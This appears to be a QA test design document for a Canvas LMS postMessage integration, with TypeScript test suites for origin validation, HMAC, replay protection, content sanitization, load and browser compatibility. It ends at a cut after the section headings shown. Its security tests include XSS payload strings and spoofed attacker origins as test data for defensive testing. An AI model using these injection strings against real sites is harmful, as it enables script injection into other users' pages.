# Story 7.1 Test Design Strategy
## Canvas postMessage Integration - Real-Time Content Extraction for Assessment Context

**Created:** 2025-09-15
**QA Agent:** Quinn (QA Test Architect)
**Story:** 7.1 - Canvas postMessage Integration
**Risk Level:** MEDIUM-HIGH (manageable with comprehensive testing)

---

## Executive Summary

This document provides a comprehensive test design strategy for Story 7.1, addressing the Canvas postMessage integration challenges identified in the QA review. The strategy focuses on security hardening, performance validation under load, Canvas environment compatibility, and functional accuracy of content extraction and context tracking.

**Key Testing Priorities:**
1. **Security Validation** - PostMessage attack vector testing, HMAC integrity, origin validation bypass prevention
2. **Performance Testing** - Real-time content extraction <500ms, D1 writes <100ms P95, concurrent user support >1000
3. **Canvas Compatibility** - Multi-environment support, version compatibility, mobile Canvas app integration
4. **Content Analysis Accuracy** - >95% page type detection, >85% concept extraction, >90% metadata completeness

**Critical Findings from QA Review:**
- Repository pattern violation in `CanvasPostMessageService` requires immediate fix
- HMAC key management strategy must be defined before development
- Content sanitization framework needed to prevent XSS vulnerabilities
- Performance targets require validation with realistic load testing

---

## 1. Test Strategy Overview

### 1.1 Testing Approach

**Test Pyramid Structure:**
```
                    ┌─────────────────┐
                    │   E2E Tests     │ <- 15% (Canvas integration workflows)
                    │   (Playwright)  │
                ┌───┴─────────────────┴───┐
                │  Integration Tests      │ <- 35% (postMessage, content extraction)
                │  (Vitest + Canvas Sim)  │
            ┌───┴─────────────────────────┴───┐
            │     Unit Tests                  │ <- 50% (Services, repositories, utils)
            │  (Vitest + Test Factories)     │
            └─────────────────────────────────┘
```

**Quality Gates:**
- Unit Test Coverage: >80% for all new components
- Integration Test Coverage: >90% of Canvas integration points
- Security Test Coverage: 100% of attack vectors identified
- Performance Test Coverage: All real-time content processing components
- E2E Test Coverage: 100% of acceptance criteria workflows

### 1.2 Canvas-Specific Test Environment Matrix

| Environment | Purpose | Canvas Setup | Security Context | Performance Profile |
|------------|---------|--------------|------------------|-------------------|
| **Unit** | Component isolation | Mock postMessage API | Mock malicious messages | Synthetic load simulation |
| **Integration** | Canvas communication | Canvas sandbox + test domains | Real origin validation | Realistic message volumes |
| **Staging** | Multi-environment validation | Production Canvas instances | Production security policies | Scaled load testing |
| **Security** | Penetration testing | Mock malicious Canvas instances | Attack vector simulation | Stress testing abuse scenarios |
| **Performance** | Load validation | Isolated Canvas test environment | Minimal security overhead | Maximum realistic load |

### 1.3 Risk-Based Testing Priorities

**Priority 1 - Critical Security Vulnerabilities:**
- PostMessage origin validation bypass prevention
- HMAC signature verification and key rotation
- Content sanitization against XSS attacks
- Replay attack prevention with nonce validation

**Priority 2 - Performance & Scale:**
- Real-time content extraction latency (<500ms)
- Concurrent user support (>1000 simultaneous sessions)
- D1 database write performance (<100ms P95)
- Memory efficiency in content processing

**Priority 3 - Canvas Compatibility:**
- Multi-Canvas environment support (instructure.com, hosted instances)
- Canvas version compatibility across major releases
- Mobile Canvas app integration where available
- Graceful degradation for limited environments

---

## 2. Security Testing

### 2.1 PostMessage Attack Vector Testing

**Objective:** Prevent all identified Canvas postMessage attack vectors with 100% validation success rate

#### 2.1.1 Origin Validation Security Tests

```typescript
interface SecurityTestScenario {
  scenarioName: string;
  attackVector: string;
  maliciousOrigin: string;
  expectedResult: 'BLOCKED' | 'PASSED';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
}

export const originAttackVectors: SecurityTestScenario[] = [
  // Domain spoofing attacks
  {
    scenarioName: 'Malicious Subdomain Bypass',
    attackVector: 'subdomain_spoofing',
    maliciousOrigin: 'https://evil.instructure.com.attacker.com',
    expectedResult: 'BLOCKED',
    severity: 'CRITICAL'
  },
  {
    scenarioName: 'Reverse Domain Bypass',
    attackVector: 'reverse_domain',
    maliciousOrigin: 'https://instructure.com.evil.com',
    expectedResult: 'BLOCKED',
    severity: 'CRITICAL'
  },
  {
    scenarioName: 'Similar Domain Attack',
    attackVector: 'typosquatting',
    maliciousOrigin: 'https://instructur3.com',
    expectedResult: 'BLOCKED',
    severity: 'HIGH'
  },

  // Protocol manipulation attacks
  {
    scenarioName: 'HTTP Downgrade Attack',
    attackVector: 'protocol_downgrade',
    maliciousOrigin: 'http://canvas.instructure.com',
    expectedResult: 'BLOCKED',
    severity: 'HIGH'
  },
  {
    scenarioName: 'Missing Protocol Attack',
    attackVector: 'protocol_omission',
    maliciousOrigin: 'canvas.instructure.com',
    expectedResult: 'BLOCKED',
    severity: 'MEDIUM'
  },

  // Path manipulation attacks
  {
    scenarioName: 'Path Traversal in Origin',
    attackVector: 'path_traversal',
    maliciousOrigin: 'https://canvas.instructure.com/../evil.com',
    expectedResult: 'BLOCKED',
    severity: 'MEDIUM'
  },

  // Canvas-specific legitimate origins (should pass)
  {
    scenarioName: 'Legitimate Canvas Cloud',
    attackVector: 'none',
    maliciousOrigin: 'https://canvas.instructure.com',
    expectedResult: 'PASSED',
    severity: 'LOW'
  },
  {
    scenarioName: 'Legitimate Institution Canvas',
    attackVector: 'none',
    maliciousOrigin: 'https://university.instructure.com',
    expectedResult: 'PASSED',
    severity: 'LOW'
  },
  {
    scenarioName: 'Canvas Test Environment',
    attackVector: 'none',
    maliciousOrigin: 'https://canvas.test.instructure.com',
    expectedResult: 'PASSED',
    severity: 'LOW'
  }
];
```

#### 2.1.2 Security Testing Implementation

```typescript
describe('Canvas PostMessage Security', () => {
  let securityService: PostMessageSecurityService;
  let attackVectorTester: SecurityTestHarness;

  beforeEach(() => {
    // Use production-equivalent security configuration
    securityService = new PostMessageSecurityService({
      allowedOrigins: [
        'canvas.instructure.com',
        '*.instructure.com',
        '*.canvaslms.com'
      ],
      hmacKeyRotationEnabled: true,
      rateLimitEnabled: true,
      replayProtectionEnabled: true
    });

    attackVectorTester = new SecurityTestHarness(securityService);
  });

  describe('Origin Validation Security', () => {
    originAttackVectors.forEach(scenario => {
      it(`should ${scenario.expectedResult.toLowerCase()} ${scenario.scenarioName}`, async () => {
        const maliciousMessage = {
          origin: scenario.maliciousOrigin,
          data: {
            type: 'canvas.content.extracted',
            sessionId: 'test-session-123',
            contentData: {
              pageUrl: 'https://canvas.instructure.com/courses/123/assignments/456',
              contentType: 'assignment',
              extractedContent: '<script>alert("XSS")</script><p>Assignment content</p>'
            },
            timestamp: Date.now(),
            signature: 'potentially-forged-signature'
          }
        };

        const result = await attackVectorTester.simulateAttack(maliciousMessage);

        if (scenario.expectedResult === 'BLOCKED') {
          expect(result.blocked).toBe(true);
          expect(result.reason).toContain('origin validation failed');
          expect(result.securityEvent).toBeDefined();
        } else {
          expect(result.blocked).toBe(false);
          expect(result.processed).toBe(true);
        }

        // Log security event for audit
        if (scenario.severity === 'CRITICAL' && result.blocked) {
          console.log(`✅ CRITICAL ATTACK BLOCKED: ${scenario.scenarioName}`);
        }
      });
    });
  });

  describe('HMAC Signature Validation', () => {
    it('should validate authentic Canvas messages with correct HMAC', async () => {
      const validMessage = await createAuthenticCanvasMessage({
        type: 'canvas.content.navigation',
        contentId: 'assignment-123',
        courseId: 'course-456'
      });

      const result = await securityService.validateMessage(validMessage);

      expect(result.valid).toBe(true);
      expect(result.hmacValid).toBe(true);
      expect(result.originValid).toBe(true);
    });

    it('should reject messages with invalid HMAC signatures', async () => {
      const tamperedMessage = await createAuthenticCanvasMessage({
        type: 'canvas.content.navigation',
        contentId: 'assignment-123',
        courseId: 'course-456'
      });

      // Tamper with the message content
      tamperedMessage.data.contentId = 'assignment-999';

      const result = await securityService.validateMessage(tamperedMessage);

      expect(result.valid).toBe(false);
      expect(result.hmacValid).toBe(false);
      expect(result.reason).toContain('HMAC validation failed');
    });

    it('should reject messages without HMAC signatures', async () => {
      const unsignedMessage = {
        origin: 'https://canvas.instructure.com',
        data: {
          type: 'canvas.content.navigation',
          contentId: 'assignment-123',
          timestamp: Date.now()
          // Missing signature
        }
      };

      const result = await securityService.validateMessage(unsignedMessage);

      expect(result.valid).toBe(false);
      expect(result.reason).toContain('Missing HMAC signature');
    });
  });

  describe('Replay Attack Prevention', () => {
    it('should prevent replay attacks using nonce validation', async () => {
      const message = await createAuthenticCanvasMessage({
        type: 'canvas.content.extracted',
        nonce: 'unique-nonce-12345'
      });

      // First message should succeed
      const firstResult = await securityService.validateMessage(message);
      expect(firstResult.valid).toBe(true);

      // Replay should be blocked
      const replayResult = await securityService.validateMessage(message);
      expect(replayResult.valid).toBe(false);
      expect(replayResult.reason).toContain('Nonce already used');
    });

    it('should reject messages older than time window', async () => {
      const oldMessage = await createAuthenticCanvasMessage({
        type: 'canvas.content.extracted',
        timestamp: Date.now() - (10 * 60 * 1000), // 10 minutes old
        nonce: 'old-nonce-123'
      });

      const result = await securityService.validateMessage(oldMessage);

      expect(result.valid).toBe(false);
      expect(result.reason).toContain('Message too old');
    });
  });

  describe('Rate Limiting Protection', () => {
    it('should enforce rate limits per session', async () => {
      const sessionId = 'test-session-123';

      // Send messages up to the rate limit (60 per minute)
      for (let i = 0; i < 60; i++) {
        const message = await createAuthenticCanvasMessage({
          type: 'canvas.content.signal',
          sessionId,
          nonce: `nonce-${i}`
        });

        const result = await securityService.validateMessage(message);
        expect(result.valid).toBe(true);
      }

      // 61st message should be rate limited
      const excessMessage = await createAuthenticCanvasMessage({
        type: 'canvas.content.signal',
        sessionId,
        nonce: 'excess-nonce'
      });

      const result = await securityService.validateMessage(excessMessage);
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('Rate limit exceeded');
    });
  });
});
```

### 2.2 Content Sanitization Security

#### 2.2.1 XSS Prevention Testing

```typescript
describe('Content Sanitization Security', () => {
  let contentSanitizer: ContentSanitizationService;
  let xssTestVectors: XSSTestVector[];

  beforeEach(() => {
    contentSanitizer = new ContentSanitizationService({
      allowedTags: ['p', 'div', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'a', 'strong', 'em'],
      allowedAttributes: ['href', 'class', 'id'],
      stripUnknownTags: true,
      encodeHtmlEntities: true
    });

    xssTestVectors = [
      {
        name: 'Script Tag Injection',
        maliciousContent: '<script>alert("XSS")</script><p>Normal content</p>',
        expectedContent: '<p>Normal content</p>',
        attackType: 'script_injection'
      },
      {
        name: 'Event Handler Injection',
        maliciousContent: '<p onclick="alert(\'XSS\')">Click me</p>',
        expectedContent: '<p>Click me</p>',
        attackType: 'event_handler'
      },
      {
        name: 'iframe Injection',
        maliciousContent: '<iframe src="https://evil.com"></iframe><p>Content</p>',
        expectedContent: '[Embedded content removed for security]<p>Content</p>',
        attackType: 'iframe_injection'
      },
      {
        name: 'CSS Expression Injection',
        maliciousContent: '<div style="background: expression(alert(\'XSS\'))">Content</div>',
        expectedContent: '<div>Content</div>',
        attackType: 'css_expression'
      },
      {
        name: 'SVG Script Injection',
        maliciousContent: '<svg onload="alert(\'XSS\')"><rect width="100" height="100"/></svg>',
        expectedContent: '[Embedded content removed for security]',
        attackType: 'svg_script'
      }
    ];
  });

  xssTestVectors.forEach(vector => {
    it(`should sanitize ${vector.name}`, async () => {
      const sanitizedContent = await contentSanitizer.sanitizeCanvasContent(vector.maliciousContent);

      expect(sanitizedContent.cleanHtml).toBe(vector.expectedContent);
      expect(sanitizedContent.threatsRemoved).toContain(vector.attackType);
      expect(sanitizedContent.safe).toBe(true);

      // Verify no script execution possible
      expect(sanitizedContent.cleanHtml).not.toContain('<script');
      expect(sanitizedContent.cleanHtml).not.toContain('javascript:');
      expect(sanitizedContent.cleanHtml).not.toContain('onload=');
      expect(sanitizedContent.cleanHtml).not.toContain('onclick=');
    });
  });

  it('should preserve safe Canvas content structure', async () => {
    const safeCanvasContent = `
      <div class="canvas-assignment">
        <h2>Assignment: Data Structures</h2>
        <p>Complete the following tasks:</p>
        <ol>
          <li>Implement a binary tree</li>
          <li>Write unit tests</li>
        </ol>
        <a href="/courses/123/files/456">Download starter code</a>
      </div>
    `;

    const sanitizedContent = await contentSanitizer.sanitizeCanvasContent(safeCanvasContent);

    expect(sanitizedContent.safe).toBe(true);
    expect(sanitizedContent.threatsRemoved).toHaveLength(0);
    expect(sanitizedContent.cleanHtml).toContain('Assignment: Data Structures');
    expect(sanitizedContent.cleanHtml).toContain('<ol>');
    expect(sanitizedContent.cleanHtml).toContain('href="/courses/123/files/456"');
  });
});
```

---

## 3. Performance Testing

### 3.1 Real-Time Content Extraction Performance

**Objective:** Validate <500ms content extraction, <100ms P95 database writes, >1000 concurrent user support

#### 3.1.1 Content Processing Load Tests

```typescript
interface ContentExtractionLoadTest {
  testName: string;
  concurrentSessions: number;
  extractionsPerSecond: number;
  contentComplexity: 'simple' | 'medium' | 'complex';
  durationMinutes: number;
  performanceTargets: {
    extractionLatencyP95: number; // milliseconds
    dbWriteLatencyP95: number; // milliseconds
    errorRate: number; // percentage
    memoryUsagePerSession: number; // MB
  };
}

export const contentLoadTests: ContentExtractionLoadTest[] = [
  {
    testName: 'Normal Canvas Usage',
    concurrentSessions: 100,
    extractionsPerSecond: 5,
    contentComplexity: 'medium',
    durationMinutes: 10,
    performanceTargets: {
      extractionLatencyP95: 300,
      dbWriteLatencyP95: 50,
      errorRate: 0.1,
      memoryUsagePerSession: 50
    }
  },
  {
    testName: 'Peak Class Activity',
    concurrentSessions: 500,
    extractionsPerSecond: 8,
    contentComplexity: 'medium',
    durationMinutes: 15,
    performanceTargets: {
      extractionLatencyP95: 400,
      dbWriteLatencyP95: 75,
      errorRate: 0.5,
      memoryUsagePerSession: 75
    }
  },
  {
    testName: 'Scale Target Load',
    concurrentSessions: 1000,
    extractionsPerSecond: 10,
    contentComplexity: 'complex',
    durationMinutes: 20,
    performanceTargets: {
      extractionLatencyP95: 500,
      dbWriteLatencyP95: 100,
      errorRate: 1.0,
      memoryUsagePerSession: 100
    }
  },
  {
    testName: 'Stress Test - Complex Content',
    concurrentSessions: 200,
    extractionsPerSecond: 15,
    contentComplexity: 'complex',
    durationMinutes: 30,
    performanceTargets: {
      extractionLatencyP95: 450,
      dbWriteLatencyP95: 90,
      errorRate: 0.8,
      memoryUsagePerSession: 120
    }
  }
];
```

#### 3.1.2 Performance Testing Implementation

```typescript
describe('Canvas Content Extraction Performance', () => {
  let loadTestHarness: CanvasLoadTestHarness;
  let performanceMonitor: PerformanceMonitor;

  beforeAll(() => {
    loadTestHarness = new CanvasLoadTestHarness();
    performanceMonitor = new PerformanceMonitor();
  });

  contentLoadTests.forEach(testConfig => {
    it(`should meet performance targets under ${testConfig.testName}`, async () => {
      // Generate realistic Canvas content based on complexity
      const contentGenerator = new CanvasContentGenerator(testConfig.contentComplexity);

      const loadTest = await loadTestHarness.startLoadTest({
        concurrentSessions: testConfig.concurrentSessions,
        extractionsPerSecond: testConfig.extractionsPerSecond,
        durationMs: testConfig.durationMinutes * 60 * 1000,
        contentGenerator
      });

      // Monitor performance metrics during test
      const performanceResults = await performanceMonitor.monitorDuringTest(loadTest);

      // Validate extraction latency
      expect(performanceResults.contentExtraction.latencyP95)
        .toBeLessThan(testConfig.performanceTargets.extractionLatencyP95);

      // Validate database write performance
      expect(performanceResults.databaseWrites.latencyP95)
        .toBeLessThan(testConfig.performanceTargets.dbWriteLatencyP95);

      // Validate error rates
      expect(performanceResults.errorRate)
        .toBeLessThan(testConfig.performanceTargets.errorRate);

      // Validate memory usage
      expect(performanceResults.memoryUsage.perSession)
        .toBeLessThan(testConfig.performanceTargets.memoryUsagePerSession);

      // Canvas-specific performance validations
      expect(performanceResults.canvasApiCalls.successRate).toBeGreaterThan(0.98);
      expect(performanceResults.postMessageLatency.p95).toBeLessThan(50);
      expect(performanceResults.contentAnalysis.throughput).toBeGreaterThan(testConfig.extractionsPerSecond * 0.9);

      console.log(`✅ ${testConfig.testName} performance targets met:`, {
        extractionLatency: `${performanceResults.contentExtraction.latencyP95}ms`,
        dbWriteLatency: `${performanceResults.databaseWrites.latencyP95}ms`,
        errorRate: `${performanceResults.errorRate}%`,
        memoryPerSession: `${performanceResults.memoryUsage.perSession}MB`
      });
    }, 60000); // 60 second timeout for load tests
  });

  describe('Workers AI Content Analysis Performance', () => {
    it('should process content analysis within latency targets', async () => {
      const complexCanvasContent = generateComplexCanvasContent({
        assignmentText: 5000, // 5000 words
        codeBlocks: 10,
        mathEquations: 15,
        embeddedImages: 8,
        discussionPosts: 25
      });

      const startTime = Date.now();

      const analysisResult = await contentAnalysisService.analyzeCanvasContent(complexCanvasContent);

      const analysisLatency = Date.now() - startTime;

      // Validate analysis latency (target: Workers AI analysis should not dominate total latency)
      expect(analysisLatency).toBeLessThan(2000); // 2 seconds for complex content

      // Validate analysis quality
      expect(analysisResult.concepts.length).toBeGreaterThan(5);
      expect(analysisResult.learningObjectives.length).toBeGreaterThan(2);
      expect(analysisResult.difficulty).toBeOneOf(['beginner', 'intermediate', 'advanced']);
      expect(analysisResult.estimatedDuration).toBeGreaterThan(0);
    });

    it('should handle concurrent analysis requests efficiently', async () => {
      const concurrentAnalyses = 20;
      const contentSamples = Array.from({ length: concurrentAnalyses }, (_, i) =>
        generateMediumCanvasContent({ seed: i })
      );

      const startTime = Date.now();

      const analysisResults = await Promise.all(
        contentSamples.map(content => contentAnalysisService.analyzeCanvasContent(content))
      );

      const totalTime = Date.now() - startTime;
      const avgTimePerAnalysis = totalTime / concurrentAnalyses;

      expect(avgTimePerAnalysis).toBeLessThan(1500); // Average 1.5s per analysis
      expect(analysisResults).toHaveLength(concurrentAnalyses);

      analysisResults.forEach(result => {
        expect(result.concepts).toBeDefined();
        expect(result.confidence).toBeGreaterThan(0.7);
      });
    });
  });

  describe('D1 Database Write Performance', () => {
    it('should handle high-volume content reference writes', async () => {
      const batchSize = 100;
      const contentReferences = Array.from({ length: batchSize }, (_, i) =>
        generateContentReference({
          studentId: `student-${i % 50}`, // 50 different students
          courseId: `course-${Math.floor(i / 10)}`, // 10 different courses
          contentType: ['assignment', 'quiz', 'discussion', 'module'][i % 4]
        })
      );

      const startTime = Date.now();

      await contentReferenceRepository.batchCreate(contentReferences);

      const batchWriteTime = Date.now() - startTime;
      const timePerWrite = batchWriteTime / batchSize;

      expect(timePerWrite).toBeLessThan(10); // <10ms per content reference write
      expect(batchWriteTime).toBeLessThan(500); // <500ms for 100 writes
    });

    it('should maintain write performance under concurrent load', async () => {
      const concurrentBatches = 10;
      const writesPerBatch = 50;

      const batchPromises = Array.from({ length: concurrentBatches }, async (_, batchIndex) => {
        const contentReferences = Array.from({ length: writesPerBatch }, (_, i) =>
          generateContentReference({
            studentId: `student-${batchIndex}-${i}`,
            courseId: `course-${batchIndex}`,
            contentType: 'assignment'
          })
        );

        const startTime = Date.now();
        await contentReferenceRepository.batchCreate(contentReferences);
        return Date.now() - startTime;
      });

      const batchTimes = await Promise.all(batchPromises);
      const avgBatchTime = batchTimes.reduce((sum, time) => sum + time, 0) / concurrentBatches;
      const p95BatchTime = batchTimes.sort((a, b) => a - b)[Math.floor(batchTimes.length * 0.95)];

      expect(avgBatchTime).toBeLessThan(400); // Average batch time <400ms
      expect(p95BatchTime).toBeLessThan(600); // P95 batch time <600ms
    });
  });
});
```

### 3.2 Canvas Context State Management Performance

```typescript
describe('Canvas Context State Performance', () => {
  let contextTracker: CanvasContextTracker;
  let stateLoadTester: StateLoadTester;

  beforeEach(() => {
    contextTracker = new CanvasContextTracker();
    stateLoadTester = new StateLoadTester();
  });

  it('should maintain real-time context updates under load', async () => {
    const concurrentSessions = 500;
    const contextUpdatesPerSecond = 15; // High navigation activity
    const testDurationMs = 60000; // 1 minute

    const loadTest = await stateLoadTester.simulateContextUpdates({
      concurrentSessions,
      updatesPerSecond: contextUpdatesPerSecond,
      durationMs: testDurationMs
    });

    expect(loadTest.stateUpdateLatency.p95).toBeLessThan(100); // <100ms P95
    expect(loadTest.stateSyncSuccess).toBeGreaterThan(0.99); // >99% sync success
    expect(loadTest.memoryUsagePerSession).toBeLessThan(50); // <50MB per session
    expect(loadTest.contextAccuracy).toBeGreaterThan(0.95); // >95% context accuracy
  });

  it('should handle Durable Object hibernation gracefully', async () => {
    // Simulate long-running session with periods of inactivity
    const sessionId = 'test-session-hibernation';

    // Active period
    await contextTracker.updateContext(sessionId, generateCanvasNavigationEvent());

    // Simulate hibernation (30 minutes of inactivity)
    await new Promise(resolve => setTimeout(resolve, 1800000)); // Simulate in test

    // Resume activity - should wake from hibernation
    const startTime = Date.now();
    await contextTracker.updateContext(sessionId, generateCanvasNavigationEvent());
    const wakeupLatency = Date.now() - startTime;

    expect(wakeupLatency).toBeLessThan(2000); // <2s wakeup from hibernation

    const currentContext = await contextTracker.getCurrentContext(sessionId);
    expect(currentContext).toBeDefined();
    expect(currentContext.sessionId).toBe(sessionId);
  });
});
```

---

## 4. Integration Testing

### 4.1 Canvas Environment Compatibility Testing

**Objective:** Validate Canvas integration across different Canvas deployments, versions, and configurations

#### 4.1.1 Canvas Environment Test Matrix

```typescript
interface CanvasEnvironmentConfig {
  name: string;
  domains: string[];
  version: string;
  features: CanvasFeature[];
  limitations: CanvasLimitation[];
  postMessageSupport: 'full' | 'partial' | 'limited' | 'none';
  mobileSupport: 'full' | 'partial' | 'none';
}

type CanvasFeature = 'postMessage' | 'deepLinking' | 'namesRoles' | 'assignmentGrading' | 'contentItems';
type CanvasLimitation = 'limited-api-access' | 'restricted-postmessage' | 'no-mobile-support' | 'version-compatibility';

export const canvasEnvironments: CanvasEnvironmentConfig[] = [
  {
    name: 'Canvas Cloud (Production)',
    domains: ['canvas.instructure.com', '*.instructure.com'],
    version: 'latest',
    features: ['postMessage', 'deepLinking', 'namesRoles', 'assignmentGrading', 'contentItems'],
    limitations: [],
    postMessageSupport: 'full',
    mobileSupport: 'partial'
  },
  {
    name: 'Canvas Cloud (Beta)',
    domains: ['canvas.beta.instructure.com'],
    version: 'beta',
    features: ['postMessage', 'deepLinking', 'namesRoles', 'assignmentGrading'],
    limitations: ['version-compatibility'],
    postMessageSupport: 'full',
    mobileSupport: 'partial'
  },
  {
    name: 'Institution Hosted Canvas',
    domains: ['*.edu', '*.ac.uk', '*.edu.au'],
    version: 'varies',
    features: ['postMessage', 'deepLinking'],
    limitations: ['limited-api-access', 'version-compatibility'],
    postMessageSupport: 'partial',
    mobileSupport: 'limited'
  },
  {
    name: 'Canvas Community (Open Source)',
    domains: ['community.canvaslms.com', '*.canvaslms.org'],
    version: 'open-source',
    features: ['postMessage'],
    limitations: ['limited-api-access', 'restricted-postmessage', 'no-mobile-support'],
    postMessageSupport: 'limited',
    mobileSupport: 'none'
  },
  {
    name: 'Canvas Test Environment',
    domains: ['canvas.test.instructure.com', '*.test.instructure.com'],
    version: 'development',
    features: ['postMessage', 'deepLinking', 'namesRoles'],
    limitations: ['version-compatibility'],
    postMessageSupport: 'full',
    mobileSupport: 'full'
  }
];
```

#### 4.1.2 Multi-Environment Integration Tests

```typescript
describe('Canvas Environment Compatibility', () => {
  canvasEnvironments.forEach(environment => {
    describe(`${environment.name} Integration`, () => {
      let canvasSimulator: CanvasEnvironmentSimulator;
      let integrationTestHarness: CanvasIntegrationTestHarness;

      beforeEach(() => {
        canvasSimulator = new CanvasEnvironmentSimulator(environment);
        integrationTestHarness = new CanvasIntegrationTestHarness();
      });

      it('should establish postMessage communication successfully', async () => {
        if (environment.postMessageSupport === 'none') {
          // Test graceful degradation
          const fallbackResult = await integrationTestHarness.testFallbackMode(environment);
          expect(fallbackResult.fallbackActivated).toBe(true);
          expect(fallbackResult.basicFunctionalityAvailable).toBe(true);
          return;
        }

        const communicationResult = await integrationTestHarness.establishCommunication(environment);

        expect(communicationResult.handshakeSuccessful).toBe(true);
        expect(communicationResult.messageDeliveryWorking).toBe(true);

        if (environment.postMessageSupport === 'full') {
          expect(communicationResult.bidirectionalCommunication).toBe(true);
          expect(communicationResult.messageChannelSupport).toBe(true);
        }
      });

      it('should extract content accurately for this environment', async () => {
        const contentTestSuite = await integrationTestHarness.createContentTestSuite(environment);

        // Test different Canvas page types available in this environment
        const pageTypes = ['assignment', 'quiz', 'discussion', 'module', 'page'];

        for (const pageType of pageTypes) {
          const testPage = await canvasSimulator.createTestPage(pageType);
          const extractionResult = await contentTestSuite.extractContent(testPage);

          expect(extractionResult.success).toBe(true);
          expect(extractionResult.pageType).toBe(pageType);
          expect(extractionResult.contentQuality.score).toBeGreaterThan(0.8);

          // Validate environment-specific extraction capabilities
          if (environment.features.includes('contentItems')) {
            expect(extractionResult.metadata.contentItems).toBeDefined();
          }

          if (environment.limitations.includes('limited-api-access')) {
            expect(extractionResult.extractionMethod).toBe('dom-fallback');
          } else {
            expect(extractionResult.extractionMethod).toBe('canvas-api');
          }
        }
      });

      it('should handle environment-specific limitations gracefully', async () => {
        for (const limitation of environment.limitations) {
          const limitationTest = await integrationTestHarness.testLimitation(limitation);

          switch (limitation) {
            case 'limited-api-access':
              expect(limitationTest.fallbackMechanismActivated).toBe(true);
              expect(limitationTest.functionalityDegraded).toBe(true);
              expect(limitationTest.coreFeaturesMaintained).toBe(true);
              break;

            case 'restricted-postmessage':
              expect(limitationTest.postMessageLimited).toBe(true);
              expect(limitationTest.alternativeCommunicationUsed).toBe(true);
              break;

            case 'version-compatibility':
              expect(limitationTest.versionDetected).toBe(true);
              expect(limitationTest.compatibilityModeEnabled).toBe(true);
              break;
          }
        }
      });

      it('should maintain security standards across environments', async () => {
        const securityTest = await integrationTestHarness.validateEnvironmentSecurity(environment);

        // Origin validation should work for all environments
        expect(securityTest.originValidationWorking).toBe(true);

        // HMAC validation should work where postMessage is supported
        if (environment.postMessageSupport !== 'none') {
          expect(securityTest.hmacValidationWorking).toBe(true);
        }

        // Content sanitization should always work
        expect(securityTest.contentSanitizationWorking).toBe(true);

        // Environment-specific security validations
        environment.domains.forEach(domain => {
          expect(securityTest.allowedOrigins).toContain(domain);
        });
      });

      if (environment.mobileSupport !== 'none') {
        it('should support mobile Canvas interactions', async () => {
          const mobileTest = await integrationTestHarness.testMobileSupport(environment);

          expect(mobileTest.mobileDetectionWorking).toBe(true);

          if (environment.mobileSupport === 'full') {
            expect(mobileTest.postMessageOnMobile).toBe(true);
            expect(mobileTest.contentExtractionOnMobile).toBe(true);
          } else {
            expect(mobileTest.fallbackModeOnMobile).toBe(true);
          }
        });
      }
    });
  });
});
```

### 4.2 Browser Compatibility Testing

#### 4.2.1 Cross-Browser Test Matrix

```typescript
interface BrowserTestConfig {
  browser: string;
  version: string;
  postMessageSupport: 'full' | 'partial' | 'limited';
  messageChannelSupport: boolean;
  cryptoApiSupport: boolean;
  canvasCompatibility: 'excellent' | 'good' | 'fair' | 'poor';
  testPriority: 'high' | 'medium' | 'low';
}

export const browserTestMatrix: BrowserTestConfig[] = [
  {
    browser: 'Chrome',
    version: '90+',
    postMessageSupport: 'full',
    messageChannelSupport: true,
    cryptoApiSupport: true,
    canvasCompatibility: 'excellent',
    testPriority: 'high'
  },
  {
    browser: 'Firefox',
    version: '88+',
    postMessageSupport: 'full',
    messageChannelSupport: true,
    cryptoApiSupport: true,
    canvasCompatibility: 'excellent',
    testPriority: 'high'
  },
  {
    browser: 'Safari',
    version: '14+',
    postMessageSupport: 'partial',
    messageChannelSupport: true,
    cryptoApiSupport: true,
    canvasCompatibility: 'good',
    testPriority: 'high'
  },
  {
    browser: 'Edge',
    version: '90+',
    postMessageSupport: 'full',
    messageChannelSupport: true,
    cryptoApiSupport: true,
    canvasCompatibility: 'excellent',
    testPriority: 'medium'
  },
  {
    browser: 'Chrome Mobile',
    version: '90+',
    postMessageSupport: 'partial',
    messageChannelSupport: false,
    cryptoApiSupport: true,
    canvasCompatibility: 'fair',
    testPriority: 'medium'
  },
  {
    browser: 'Safari Mobile',
    version: '14+',
    postMessageSupport: 'limited',
    messageChannelSupport: false,
    cryptoApiSupport: true,
    canvasCompatibility: 'fair',
    testPriority: 'medium'
  }
];
```

#### 4.2.2 Browser Compatibility Test Implementation

```typescript
describe('Cross-Browser Canvas Integration', () => {
  browserTestMatrix
    .filter(config => config.testPriority === 'high')
    .forEach(browserConfig => {
      describe(`${browserConfig.browser} ${browserConfig.version}`, () => {
        let browserTestEnvironment: BrowserTestEnvironment;

        beforeEach(async () => {
          browserTestEnvironment = await BrowserTestEnvironment.create(browserConfig);
        });

        afterEach(async () => {
          await browserTestEnvironment.cleanup();
        });

        it('should handle postMessage communication properly', async () => {
          const postMessageTest = await browserTestEnvironment.testPostMessage();

          if (browserConfig.postMessageSupport === 'full') {
            expect(postMessageTest.basicMessaging).toBe(true);
            expect(postMessageTest.originValidation).toBe(true);
            expect(postMessageTest.messageIntegrity).toBe(true);
          } else if (browserConfig.postMessageSupport === 'partial') {
            expect(postMessageTest.basicMessaging).toBe(true);
            expect(postMessageTest.limitationsHandled).toBe(true);
          } else {
            expect(postMessageTest.fallbackActivated).toBe(true);
          }
        });

        it('should perform content extraction within browser limits', async () => {
          const extractionTest = await browserTestEnvironment.testContentExtraction();

          expect(extractionTest.contentExtracted).toBe(true);
          expect(extractionTest.extractionLatency).toBeLessThan(1000); // 1 second max

          if (browserConfig.canvasCompatibility === 'excellent') {
            expect(extractionTest.fullFeatureSupport).toBe(true);
          } else {
            expect(extractionTest.degradedGracefully).toBe(true);
          }
        });

        it('should handle browser-specific security requirements', async () => {
          const securityTest = await browserTestEnvironment.testSecurity();

          expect(securityTest.originValidationWorking).toBe(true);

          if (browserConfig.cryptoApiSupport) {
            expect(securityTest.hmacValidationWorking).toBe(true);
          } else {
            expect(securityTest.fallbackSecurityWorking).toBe(true);
          }
        });

        if (browserConfig.messageChannelSupport) {
          it('should utilize MessageChannel for secure communication', async () => {
            const channelTest = await browserTestEnvironment.testMessageChannel();

            expect(channelTest.channelEstablished).toBe(true);
            expect(channelTest.securePortTransfer).toBe(true);
            expect(channelTest.isolatedCommunication).toBe(true);
          });
        }
      });
    });
});
```

---

## 5. Functional Testing

